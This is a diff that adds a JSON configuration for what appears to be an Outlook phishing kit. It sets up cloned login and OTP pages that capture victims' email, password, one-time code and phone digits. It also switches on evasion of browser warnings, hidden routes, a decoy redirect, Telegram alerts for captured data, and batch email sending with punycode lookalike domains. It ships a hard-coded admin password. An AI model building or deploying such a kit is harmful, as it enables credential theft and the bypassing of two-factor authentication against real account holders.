@@ -1,0 +1,115 @@
+{
+  "service": "Outlook",
+  "flask": {
+    "host": "0.0.0.0",
+    "port": 3000,
+    "debug": true
+  },
+  "mysql": {
+    "host": "localhost",
+    "user": "root",
+    "password": "",
+    "database": "panel",
+    "port": 3306
+  },
+  "admin": {
+    "login_route": "/adminlogin",
+    "dashboard_route": "/admin",
+    "password": "admin_pass"
+  },
+  "redirect": "google.com",
+  "waiting": "/waiting",
+  "background_color": "#0a0b0d",
+  "no_route": true,
+  "param_conf": {},
+  "options": {
+    "panel_status": true,
+    "anti_redpage": true,
+    "block_proxy": false,
+    "mobile_only": false,
+    "hide_route": true,
+    "showNotifications": true,
+    "deleteInactiveSessions": "true",
+    "redirectURL": "google.com",
+    "workflow_mode": false,
+    "workflow_pages": [],
+    "telegram": {
+      "telegram_bot": null,
+      "telegram_bot_username": "",
+      "telegram_notification": null,
+      "telegram_chat_id": "",
+      "telegram_bot_token": "",
+      "admin_ids": []
+    },
+    "soundEffects": true,
+    "admin_whitelist": [
+      "127.0.0.1"
+    ]
+  },
+  "email": {
+    "smtp_servers": [],
+    "email_details": {
+      "batch_size": 20,
+      "punycode": true
+    }
+  },
+  "data_links": [],
+  "pages": {
+    "outlook_login": {
+        "template": "/outlook/login.html",
+        "route": "/outlook_login",
+        "panel": {
+            "input": {
+                "name": "Outlook Password",
+                "values": [
+                    {
+                        "value": "passwd",
+                        "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                        "type": "text"
+                    }
+                ],
+                "required_data": [
+                    {
+                        "value": "email",
+                        "placeholder": "example@outlook.com",
+                        "type": "text"
+                    }
+                ]
+            }
+        },
+        "form": {
+            "passwd": "passwd"
+        },
+        "preview_image": "previews/outlook/login.png"
+    },
+    "outlook_otp": {
+        "template": "/outlook/otp.html",
+        "route": "/outlook_otp",
+        "panel": {
+            "input": {
+                "name": "Outlook OTP",
+                "values": [
+                    {
+                        "value": "iVerifyText",
+                        "placeholder_name": "otpcode",
+                        "placeholder": "OTP Code",
+                        "type": "text"
+                    }
+                ],
+                "required_data": [
+                    {
+                        "value": "phone",
+                        "placeholder": "Last 2 digits of phone number",
+                        "type": "text"
+                    }
+                ]
+            }
+        },
+        "form": {
+            "iVerifyText": "iVerifyText"
+        },
+        "preview_image": "previews/outlook/otp.png"
+    }
+  },
+  "version": "0.0"
+}
